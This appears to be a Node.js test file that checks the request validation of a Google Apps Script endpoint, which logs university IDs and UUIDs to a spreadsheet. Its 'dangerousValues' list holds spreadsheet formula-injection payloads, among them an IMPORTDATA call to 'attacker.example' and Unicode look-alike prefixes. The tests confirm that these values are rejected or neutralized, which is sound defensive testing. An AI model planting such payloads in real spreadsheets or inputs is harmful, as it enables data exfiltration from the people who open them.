const assert = require('assert');
const fs = require('fs');
const vm = require('vm');

const rows = [];
const response = (text) => ({
  text,
  setMimeType() { return this; }
});
const context = {
  ContentService: {
    MimeType: { JSON: 'json' },
    createTextOutput: response
  },
  LockService: {
    getScriptLock: () => ({ waitLock() {}, releaseLock() {} })
  },
  SpreadsheetApp: {
    getActiveSpreadsheet: () => ({
      getSheetByName: () => ({
        appendRow: (row) => rows.push(row),
        getLastRow: () => rows.length
      })
    })
  }
};

vm.createContext(context);
vm.runInContext(fs.readFileSync('Code.gs', 'utf8'), context);

function postRequest(uni, uuid) {
  const output = context.doPost({
    postData: { contents: JSON.stringify({ uni, uuid }) },
    parameter: {}
  });
  return JSON.parse(output.text);
}

function getRequest(uni, uuid) {
  const output = context.doGet({
    parameter: { uni, uuid, timestamp: '2026-07-27T12:00:00.000Z' }
  });
  return JSON.parse(output.text);
}

function assertRejected(request, uni, uuid, label) {
  const rowCount = rows.length;
  assert.strictEqual(request(uni, uuid).result, 'error', label);
  assert.strictEqual(rows.length, rowCount, `${label} must not append a row`);
}

assert.strictEqual(postRequest('HARVARD', 'A1B2C3D4').result, 'success');
assert.strictEqual(rows.length, 1);
assert.strictEqual(rows[0][1], 'HARVARD');
assert.strictEqual(rows[0][2], 'A1B2C3D4');

assert.strictEqual(getRequest('MIT_2026', 'F0E1D2C3').result, 'success');
assert.strictEqual(rows.length, 2);
assert.strictEqual(rows[1][1], 'MIT_2026');
assert.strictEqual(rows[1][2], 'F0E1D2C3');

const customUniversityIds = [
  'Harvard Admissions',
  'tsu-2026',
  "St. John's (Main)",
  'თსუ',
  'NABA/IU'
];

for (const [index, uni] of customUniversityIds.entries()) {
  const request = index % 2 === 0 ? getRequest : postRequest;
  const rowCount = rows.length;
  assert.strictEqual(request(uni, 'A1B2C3D4').result, 'success', `custom uni ${index}`);
  assert.strictEqual(rows.length, rowCount + 1);
  assert.strictEqual(rows[rowCount][1], uni);
}

const dangerousValues = [
  '=IMPORTDATA("https://attacker.example")',
  "'=1+1",
  "''+SUM(A:A)",
  '+SUM(A:A)',
  '-1+1',
  '@SUM(A:A)',
  '\t=1+1',
  '\r=1+1',
  '\n=1+1',
  '\uFF1D1+1',
  '\uFF0B1+1',
  '\uFF0D1+1',
  '\uFF201+1'
];

for (const [index, value] of dangerousValues.entries()) {
  for (const [method, request] of [['POST', postRequest], ['GET', getRequest]]) {
    assertRejected(request, value, 'A1B2C3D4', `${method} dangerous uni ${index}`);
    assertRejected(request, 'HARVARD', value, `${method} dangerous uuid ${index}`);
  }
}

assert.strictEqual(getRequest('A'.repeat(50), '12345678').result, 'success');
assertRejected(getRequest, 'A'.repeat(51), '12345678', 'uni longer than 50 characters');
for (const value of [
  '',
  ' HARVARD',
  'HARVARD ',
  'HAR\nVARD',
  'HAR\tVARD',
  'A\\B',
  'A:B',
  'A*B',
  'A?B',
  'A"B',
  'A<B',
  'A>B',
  'A|B'
]) {
  assertRejected(postRequest, value, 'A1B2C3D4', `unsafe custom uni ${JSON.stringify(value)}`);
}
assertRejected(postRequest, 'HARVARD', 'A1B2C3D', 'uuid shorter than 8 characters');
assertRejected(postRequest, 'HARVARD', 'a1b2c3d4', 'lowercase uuid');

for (const value of dangerousValues) {
  assert.strictEqual(context.neutralizeFormula(value), `'${value}`);
}
assert.strictEqual(context.neutralizeFormula('SAFE'), 'SAFE');

console.log('Code.gs request validation tests passed');
